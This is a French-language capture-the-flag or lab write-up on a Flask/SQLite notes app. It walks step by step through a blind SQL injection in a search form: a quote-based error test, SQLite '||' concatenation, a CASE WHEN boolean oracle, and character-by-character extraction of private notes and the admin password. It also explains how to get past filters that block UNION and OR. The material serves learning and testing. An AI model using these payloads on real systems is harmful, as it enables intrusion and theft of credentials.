# GhostNotes — Cas d’étude

## Contexte

Application Flask / SQLite.

Indices :
- compte `intern` ;
- tables annoncées : `users`, `notes`, `sessions` ;
- notes publiques ;
- brouillons admin ;
- `/admin` réservé à l’admin.

## 1. Comprendre la recherche

Le formulaire est en POST :

```http
POST /search
Content-Type: application/x-www-form-urlencoded

q=...
```

Un mot réel du titre retourne uniquement la note correspondante.

## 2. Détecter l’anomalie

```text
q='
```

→ `Requête invalide`

Donc l’apostrophe modifie probablement la syntaxe SQL.

## 3. Découvrir la concaténation SQLite

```sql
' || 'stagiaire
```

→ `Bienvenue stagiaire`

Donc `||` est interprété par SQLite.

## 4. Construire l’oracle

```sql
' || CASE WHEN (<condition>)
THEN 'stagiaire'
ELSE 'zzzzzz'
END || '
```

- `stagiaire` visible = vrai
- aucun résultat = faux

## 5. Lire les notes privées

Exemple :

```sql
SELECT title FROM notes WHERE id=4
```

Puis extraction caractère par caractère avec :

```sql
unicode(substr((SELECT title FROM notes WHERE id=4),1,1))
```

## 6. Trouver la bonne colonne

`content` → erreur.

`body` → existe.

Donc :

```sql
SELECT body FROM notes WHERE id=4
```

## 7. Accélérer avec des mots entiers

Quand le début ressemble à une phrase plausible, tester directement :

```sql
substr((SELECT body FROM notes WHERE id=4),1,9)='Le coffre'
```

C’est beaucoup plus rapide que caractère par caractère.

## 8. Pivot vers users

Vérifier :

```sql
SELECT password FROM users WHERE username='admin'
```

Puis extraire si nécessaire avec le même oracle.

## Leçons

- Le message `Requête invalide` était un signal plus utile qu’un 500.
- SQLite `||` a été le pivot décisif.
- Pas besoin de `UNION` pour exploiter une blind SQLi.
- Les filtres peuvent bloquer `UNION`, `OR`, commentaires, etc. sans empêcher une exploitation via `CASE WHEN`.
